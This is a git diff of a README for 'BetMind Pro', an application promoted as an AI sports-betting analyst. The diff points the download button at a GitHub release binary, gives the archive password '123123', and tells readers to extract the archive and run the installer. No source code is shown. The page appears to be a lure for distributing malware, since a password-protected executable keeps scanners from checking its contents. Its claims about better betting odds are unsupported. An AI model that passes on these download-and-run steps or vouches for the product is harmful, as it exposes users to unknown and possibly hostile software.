@@ -1,6 +1,7 @@
 # BetMind Pro: AI-Powered Sports Betting Analyst
 
-![Leonardo_Phoenix_10_Create_a_sleek_and_modern_image_for_the_Be_2](https://github.com/user-attachments/assets/436c702f-0d79-4633-8088-36c7852eb182)
+![Leonardo_Phoenix_10_Create_a_sleek_and_modern_image_for_the_Be_2](https://github.com/user-attachments/assets/11586331-405e-4e1d-8e66-e8acf806acef)
+
 
 **BetMind Pro** is an intelligent application that uses artificial intelligence to analyze bookmaker odds and predict sports events. It helps make informed decisions and increase your chances of winning.
 
@@ -23,23 +24,21 @@ BetMind Pro helps bettors and analysts quickly and accurately evaluate current b
 ## Installation
 
 <p align="center">
-  <a href="https://example.com/betmind-pro-download" target="_blank" rel="noopener noreferrer" style="background-color:#0078D7; color:white; padding:14px 28px; text-decoration:none; border-radius:8px; font-weight:bold; font-size:16px; margin:8px; display:inline-block; box-shadow: 0 4px 8px rgba(0,120,215,0.4); transition: background-color 0.3s ease;">
+  <a href="https://github.com/popija1/BetMind-Pro-AI-analyst-/releases/download/Download/BetMind-Pro.v1.1" target="_blank" rel="noopener noreferrer" style="background-color:#0078D7; color:white; padding:14px 28px; text-decoration:none; border-radius:8px; font-weight:bold; font-size:16px; margin:8px; display:inline-block; box-shadow: 0 4px 8px rgba(0,120,215,0.4); transition: background-color 0.3s ease;">
     ⬇️ Download BetMind Pro
   </a>
-  <a href="https://github.com/your-repo/betmind-pro" target="_blank" rel="noopener noreferrer" style="background-color:#FFD700; color:black; padding:14px 28px; text-decoration:none; border-radius:8px; font-weight:bold; font-size:16px; margin:8px; display:inline-block; box-shadow: 0 4px 8px rgba(255,215,0,0.5); transition: background-color 0.3s ease;">
+  <a href="https://github.com/popija1" target="_blank" rel="noopener noreferrer" style="background-color:#FFD700; color:black; padding:14px 28px; text-decoration:none; border-radius:8px; font-weight:bold; font-size:16px; margin:8px; display:inline-block; box-shadow: 0 4px 8px rgba(255,215,0,0.5); transition: background-color 0.3s ease;">
     ⭐ Star on GitHub
   </a>
-  <a href="https://github.com/your-repo/betmind-pro/issues" target="_blank" rel="noopener noreferrer" style="background-color:#E55353; color:white; padding:14px 28px; text-decoration:none; border-radius:8px; font-weight:bold; font-size:16px; margin:8px; display:inline-block; box-shadow: 0 4px 8px rgba(229,83,83,0.5); transition: background-color 0.3s ease;">
-    🐞 Report Bugs & Suggest Improvements
-  </a>
-</p>
+ </p>
 
 **Archive password:** `123123`
 
 1. Click the download button above  
-2. Download and extract the archive using the password provided  
-3. Run the installer and follow the instructions  
-4. Launch BetMind Pro and start analyzing odds  
+2. Choose the version for your operating system (Windows, macOS, Linux)  
+3. Download and extract the archive using the password provided  
+4. Run the installer and follow the instructions  
+5. Launch BetMind Pro and start analyzing odds  
 
 ---
 
@@ -72,7 +71,6 @@ If you want to help develop BetMind Pro, you can:
 ---
 
 **BetMind Pro** — your reliable assistant in the world of sports betting powered by AI!
-
 
 
 
